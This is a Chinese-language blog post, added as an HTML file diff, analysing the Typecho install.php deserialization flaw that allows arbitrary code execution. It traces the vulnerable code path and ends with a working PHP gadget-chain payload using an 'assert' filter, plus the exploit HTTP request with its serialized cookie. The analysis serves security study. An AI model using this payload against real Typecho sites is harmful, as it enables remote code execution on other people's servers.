@@ -1,0 +1,185 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Typecho 反序列化 任意代码执行 漏洞分析 | Dayu | sCRiPt n00b</title>
+
+  
+  <meta name="author" content="大宇">
+  
+
+  
+  <meta name="description" content="不如就给自己最后一次机会，奔向或许永远无法到达的理想中，死在路上。">
+  
+
+  
+  <meta name="keywords" content="dayu,大宇,大宇的博客,网络">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Typecho 反序列化 任意代码执行 漏洞分析">
+
+  <meta property="og:site_name" content="Dayu">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Dayu" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Dayu</a>
+    </h1>
+    <p class="site-description">sCRiPt n00b</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/whoami">关于</a></li>
+      
+        <li><a href="/atom.xml">订阅</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Typecho 反序列化 任意代码执行 漏洞分析</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/typecho-unserialize.html" rel="bookmark">
+        <time class="entry-date published" datetime="2017-10-26T12:13:43.000Z">
+          2017-10-26
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h2><ul>
+<li>程序安装后不会自动删除install.php，install.php中存在反序列化漏洞引发（网传是开发者故意留的后门）</li>
+<li>Typecho官方已于2017-10-24 更新v1.1-17.10.24-beta版 已修复此漏洞。</li>
+<li>测试版本：v1.1-15.5.12-beta</li>
+</ul>
+<a id="more"></a>
+<ul>
+<li>源码github地址：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/typecho/typecho/releases</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="install-php-反序列部分"><a href="#install-php-反序列部分" class="headerlink" title="install.php 反序列部分"></a>install.php 反序列部分</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">228</span>                <span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">229</span>                    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="number">230</span>                    $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line"><span class="number">231</span>                    Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line"><span class="number">232</span>                    $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line"><span class="number">233</span>                    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line"><span class="number">234</span>                    Typecho_Db::set($db);</span><br><span class="line"><span class="number">235</span>                    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>install.php</code> 的230行，会读取cookie中的<code>__typecho_config</code> ，并将其base64解码反序列后赋给<code>config</code>变量</li>
+<li>231行会删除cookie中的<code>__typecho_config</code>，这一步无关紧要。</li>
+<li>232行会实例化<code>Typecho_Db</code>，并且传值<code>$config</code>中的<code>adapter</code>和<code>prefix</code>。</li>
+<li><p>233行会调用<code>addServer</code>方法<br><code>Typecho_Cookie::get</code>的定义如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = <span class="keyword">self</span>::$_prefix . $key;</span><br><span class="line">    $value = <span class="keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">    <span class="keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  修改cookie和post内容都可以赋值。</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">由于</span><br><span class="line"><span class="number">213</span>行            <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>])) : <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">221</span>行                <span class="meta">&lt;?php</span> <span class="keyword">elseif</span> (!Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)): <span class="meta">?&gt;</span></span><br><span class="line">首先fisish，__typecho_config要有赋值，才能进行反序列化。</span><br></pre></td></tr></table></figure>
+<h2 id="继续跟进"><a href="#继续跟进" class="headerlink" title="继续跟进"></a>继续跟进</h2><p>我们先到<code>Typecho_Db</code>的构造函数看看他继续做了什么<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">    $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;   <span class="comment">//第一个参数在这里进行了拼接，如果传入的是实例化对象，会调用该对象__toString()魔术方法。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化适配器对象</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>我们找一些含有<code>__toString</code>的类，找到了<code>Typecho_Feed</code>。</li>
+<li><p>他在290行，执行了这样一段代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content .= <span class="string">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class="string">'author'</span>]-&gt;screenName) . <span class="string">'&lt;/dc:creator&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>由于我们注入的是对象，<code>$item</code>是能够控制的。我们进而就可以调用<code>__get</code>这个魔术方法，继续寻找含有<code>__get</code>的类，我们找到了<code>class Typecho_Request</code>，他的<code>__get()</code>魔术方法会调用他自己的<code>get()</code>方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">            $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $value = $default;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><code>get()</code>方法会给<code>$value</code>赋值，然后调用自己的<code>_applyFilter</code>方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>array_map</code>和<code>call_user_func</code> 中的<code>($filter, $value)</code>都是可控的，可以给<code>$filter</code>赋值<code>assert</code>两处都可进行命令执行。</p>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>payload构造<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addItem</span><span class="params">(array $item)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[] = $item;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = file_put_contents(<span class="string">'dayuinfo.php'</span>, <span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload1 = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line">$payload2 = <span class="keyword">new</span> Typecho_Request();</span><br><span class="line">$payload1-&gt;addItem(<span class="keyword">array</span>(<span class="string">'author'</span> =&gt; $payload2));</span><br><span class="line">$exp = <span class="keyword">array</span>(<span class="string">'adapter'</span> =&gt; $payload1, <span class="string">'prefix'</span> =&gt; <span class="string">''</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br></pre></td></tr></table></figure></p>
+<p>写入文件测试成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /install.php?finish=1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.2</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo2OiJBVE9NIDEiO3M6NjoiX2l0ZW1zIjthOjE6e2k6MDthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtpOjE4O31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjA6IiI7fQ==</span><br><span class="line">Referer:http://127.0.0.2/install.php</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/Web/">Web</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/PHP/">PHP</a><a href="/tags/Web/">Web</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    <br>
+    
+    &copy; 2019 大宇
+    
+  </p>
+</footer>
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-135378097-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+  </div>
+</div>
+</body>
+</html>
